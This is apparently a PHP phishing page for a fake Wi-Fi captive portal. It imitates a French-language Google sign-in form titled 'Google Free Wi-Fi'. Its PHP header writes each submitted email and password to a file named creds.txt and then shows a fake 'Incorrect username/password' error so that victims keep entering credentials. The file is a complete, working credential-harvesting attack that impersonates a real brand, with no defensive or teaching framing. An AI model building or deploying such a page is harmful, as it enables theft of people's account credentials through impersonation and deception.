<?php
$err = "";
if (!empty($_POST)) {
  $user = $_POST['username'];
  $pass = $_POST['password'];
  file_put_contents('creds.txt',"$user $pass\n",FILE_APPEND);
  $err = "Incorrect username/password. Try again.";
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=394">
<title>Sign In - Google Free Wi-Fi</title>
<link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<form novalidate action="index.php" method="post">
	<img src="google_logo.gif" alt="">
	<h1>Connexion</h1>
	<h2>avec votre compte Google</h2>
	<input id="user" type="text" name="username" placeholder="Entrez votre email">
	<input type="password" name="password" placeholder="Entrez votre mot de passe">
	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
	<p><a href="">Plus d'options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
</form>
<footer>
	France (France) <img src="caret.gif" alt="">
	<span class="text-right">Aide&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vie privée&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CGU</span>
</footer>
<script>document.onload = function() { document.getElementById("user").focus();};</script>
</body>
</html>
